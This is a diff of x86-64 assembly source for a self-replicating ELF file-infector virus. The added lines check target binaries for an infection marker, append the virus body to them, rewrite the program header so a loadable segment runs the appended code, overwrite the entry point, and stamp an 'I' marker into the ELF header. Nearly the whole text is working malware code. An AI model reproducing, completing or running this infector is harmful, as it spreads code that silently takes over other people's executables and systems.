@@ -197,6 +197,10 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		cmp dword [r15 + 1300], 0x464c457f         ; check if the file starts with 177ELF what indicates it is an ELF binary
 		jne _close_bin
 
+	_is_infected:
+		cmp dword [r15 + 1308], 0x00000074         ; check if bichooo!! ssuuuuu
+		jne _close_bin
+
 	_save_entry_dpuente:
 		mov r9, [r15 + 1324]
 		mov [r15 + 1508], r9
@@ -213,7 +217,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			imul r10, r10, PHDR_SIZE
 			add r10, EHDR_SIZE
 
-			mov qword [r15 + 1492], r10
+			mov qword [r15 + 1492], r10           ; saving phdr offset
 
 			mov rax, SYS_PREAD64
 			syscall
@@ -246,7 +250,6 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			syscall
  
 			mov [r15 + 1432], rax                  ; PT_LOAD starts at the end of the target bin to execute our code
-			; push rax
 
 			call .delta
 			.delta:
@@ -255,7 +258,6 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 
 		_append_virus:
-			; pwrite(fd, buff, count, offset)
 			mov rdi, [r15 + 1420]
 			lea rsi, [rbp + _start]
 			mov rdx, _stop - _start
@@ -263,13 +265,24 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov rax, SYS_PWRITE64
 			syscall
 
-		_write_header_changes_to_bin:              ; writes new header modifications to the binary
+		_rewrite_phdr:              ; writes new header modifications to the binary
 			mov rdi, [r15 + 1420]
 			lea rsi, [r15 + 1424]
 			mov rdx, PHDR_SIZE
-			; pop rax
-			; mov [r15 + 1432], rax                  ; PT_LOAD starts at the end of the target bin to execute our code
-			mov qword r10, [r15 + 1492]
+			mov qword r10, [r15 + 1492]            ; offset to the phdr
+			mov rax, SYS_PWRITE64
+			syscall
+
+		_rewrite_ehdr:
+			mov qword r9, [r15 + 1440]
+			mov qword [r15 + 1324], r9
+
+			mov byte [r15 + 1308], 'I'
+
+			mov rdi, [r15 + 1420]
+			lea rsi, [r15 + 1300]
+			mov rdx, EHDR_SIZE
+			mov r10, 0
 			mov rax, SYS_PWRITE64
 			syscall
 
